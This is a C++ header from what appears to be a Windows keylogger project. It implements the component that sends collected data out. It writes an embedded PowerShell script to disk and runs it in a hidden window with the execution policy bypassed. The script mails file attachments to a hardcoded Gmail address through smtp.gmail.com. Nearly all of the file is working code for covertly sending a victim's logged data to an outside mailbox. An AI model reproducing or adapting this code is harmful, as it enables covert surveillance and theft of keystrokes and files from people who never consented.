#pragma once

#include <Windows.h>
#include <fstream>
#include <iostream>
#include <vector>

#include "DefaultFileSystemAccess.h"
#include "Helper.h"
#include "Timer.h"

namespace mail
{
const std::string scriptName = "sendMail.ps1";
constexpr const char* emailTarget = "michalovskyyy@gmail.com";
constexpr const char* emailFrom = "michalovskyyy@gmail.com";
constexpr const char* emailPassword = "xxx";

const std::string powerShellScript =
"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
std::string(emailTarget) +
"\""
" -Body $Body -Subject $Subj "
"-password \"" +
std::string(emailPassword) +
"\""
" -From \"" +
std::string(emailFrom) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";


std::string stringReplace(std::string s, const std::string& stringToReplace, const std::string& replaceWith)
{
	if (stringToReplace.empty())
	{
		return s;
	}

	size_t position = 0;

	while ((position = s.find(stringToReplace, position)) != std::string::npos)
	{
		s.replace(position, stringToReplace.length(), replaceWith);
		position += replaceWith.length();
	}

	return s;
}

bool fileExists(const std::string & filePath)
{
	std::ifstream file(filePath);
	return static_cast<bool>(file);
}

bool createScript()
{
	const std::string absoluteFilePath = keylogger::FileSystemHandler::getCurrentPath(true) + scriptName;
	std::ofstream scriptFile{ absoluteFilePath };

	if (scriptFile.is_open())
	{
		scriptFile << powerShellScript;
		return true;
	}

	return false;
}

Timer timer;

int sendMail(const std::string& subject, const std::string& body, const std::string& attachments)
{
	bool directoryCreated = keylogger::FileSystemHandler::createDirectory(keylogger::FileSystemHandler::getCurrentPath(true));
	if (!directoryCreated)
	{
		return -1;
	}

	std::string scriptPath = keylogger::FileSystemHandler::getCurrentPath(true) + scriptName;

	if (!fileExists(scriptPath))
	{
		if (!createScript())
		{
			return -2;
		}
	}

	std::string parameters = "-ExecutionPolicy ByPass -File \""+ scriptPath
		+ "\" -Subj \"" + stringReplace(subject, "\"", "\\\"") +
		"\" -Body \"" + stringReplace(body, "\"", "\\\"") +
		"\" -Att \"" + attachments + "\"";

	SHELLEXECUTEINFO shellExecuteInfo = { 0 };
	shellExecuteInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	shellExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shellExecuteInfo.hwnd = NULL;
	shellExecuteInfo.lpVerb = "open";
	shellExecuteInfo.lpFile = "powershell";
	shellExecuteInfo.lpParameters = parameters.c_str();
	shellExecuteInfo.lpDirectory = NULL;
	shellExecuteInfo.nShow = SW_HIDE;
	shellExecuteInfo.hInstApp = NULL;


	bool executionStatus = static_cast<bool>(ShellExecuteEx(&shellExecuteInfo));
	if (!executionStatus)
	{
		return -3;
	}


	WaitForSingleObject(shellExecuteInfo.hProcess, 7000);
	DWORD exitCode = 100;
	GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);


	timer.setTimerCallback([&]()
		{
			WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
			GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
			if ((int)exitCode == STILL_ACTIVE)
			{
				TerminateProcess(shellExecuteInfo.hProcess, 100);
			}
			utils::appendLog("<From MailSender> Return code " + utils::toString((int)exitCode));
		});

	timer.setTotalNumberOfCalls(1L);
	timer.setInterval(10L);
	timer.start(true);

	utils::appendLog("STATUS CODE: " + std::to_string((int)exitCode));
	return static_cast<int>(exitCode);
}

int sendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& attachments)
{
	std::string attachmentsAsString;

	if (attachments.size() == 1)
	{
		attachmentsAsString = attachments.at(0);
	}
	else
	{
		for (const auto& attachment : attachments)
		{
			attachmentsAsString += attachment + "::";
		}

		attachmentsAsString = attachmentsAsString.substr(0, attachmentsAsString.length() - 2);
	}

	return sendMail(subject, body, attachmentsAsString);
}
}
